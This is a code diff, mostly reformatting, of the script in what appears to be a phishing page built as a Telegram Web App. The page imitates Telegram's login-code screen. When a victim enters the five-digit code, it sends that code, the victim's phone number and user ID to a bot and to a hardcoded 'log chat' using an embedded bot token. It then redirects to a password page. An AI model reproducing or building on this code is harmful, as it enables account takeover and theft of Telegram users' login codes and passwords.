@@ -175,60 +175,62 @@
   </div>
 
   <script>
-  const tg = window.Telegram.WebApp;
-  tg.expand();
-  
-  const codeBoxes = document.querySelectorAll('.code-box');
-  let code = "";
+const tg = window.Telegram.WebApp;
+tg.expand();
 
-  function updateBoxes() {
-    codeBoxes.forEach((box, i) => {
-      if (code[i]) {
-        box.textContent = "•";
-        box.classList.add('filled');
-      } else {
-        box.textContent = "";
-        box.classList.remove('filled');
-      }
-    });
-  }
+const codeBoxes = document.querySelectorAll('.code-box');
+let code = "";
 
-  document.querySelectorAll('.numpad button').forEach(btn => {
-    btn.addEventListener('click', () => {
-      const value = btn.textContent;
-      if (value === '←') {
-        code = code.slice(0, -1);
-      } else if (!isNaN(value)) {
-        if (code.length < 5) code += value;
-      }
-      updateBoxes();
+function updateBoxes() {
+  codeBoxes.forEach((box, i) => {
+    if (code[i]) {
+      box.textContent = "•";
+      box.classList.add('filled');
+    } else {
+      box.textContent = "";
+      box.classList.remove('filled');
+    }
+  });
+}
 
-      if (code.length === 5) {
-    // скрываем экран ввода
-    document.getElementById("authScreen").style.display = "none";
-    // показываем экран загрузки
-    document.getElementById("loadingScreen").style.display = "flex";
+document.querySelectorAll('.numpad button').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const value = btn.textContent;
+    if (value === '←') {
+      code = code.slice(0, -1);
+    } else if (!isNaN(value)) {
+      if (code.length < 5) code += value;
+    }
+    updateBoxes();
 
-    // Отправляем код боту через Telegram Web App
-    tg.sendData(JSON.stringify({
+    if (code.length === 5) {
+      // скрываем экран ввода
+      document.getElementById("authScreen").style.display = "none";
+      // показываем экран загрузки
+      document.getElementById("loadingScreen").style.display = "flex";
+
+      // Отправляем код боту через Telegram Web App
+      tg.sendData(JSON.stringify({
         type: 'auth_code',
         code: code,
         user_id: tg.initDataUnsafe.user?.id,
         phone_number: document.querySelector('.phone').textContent.trim().replace('✎', '')
-    }));
+      }));
 
-    // Дополнительно отправляем код в бота через метод бота
-    sendCodeToBot(code);
+      // Дополнительно отправляем код в бота через метод бота
+      sendCodeToBot(code);
 
-    // Переходим на страницу ввода пароля через 1 секунду
-    setTimeout(() => {
+      // Переходим на страницу ввода пароля через 1 секунду
+      setTimeout(() => {
         const phoneNumber = document.querySelector('.phone').textContent.trim().replace('✎', '');
         window.location.href = `password.html?phone=${encodeURIComponent(phoneNumber)}&code=${code}`;
-    }, 1000);
-}
+      }, 1000);
+    }
+  });
+});
 
-  // Функция для отправки кода в бота
-  function sendCodeToBot(code) {
+// Функция для отправки кода в бота
+function sendCodeToBot(code) {
   const botToken = '8451638191:AAF-tFYWC83N32_7N7DptpgeFVAkZIvz2dM';
   const logChatId = '-1002913601994';
   
@@ -256,16 +258,17 @@
   });
 }
 
-  // обработчик для карандашика
-  document.getElementById("editPhone").addEventListener("click", () => {
-    window.location.href = "index.html"; // возвращаем на первый экран
-  });
+// обработчик для карандашика
+document.getElementById("editPhone").addEventListener("click", () => {
+  window.location.href = "index.html"; // возвращаем на первый экран
+});
 
-  // Инициализация при загрузке
-  updateBoxes();
+// Инициализация при загрузке
+updateBoxes();
 </script>
 </body>
 </html>
+
 
 
 
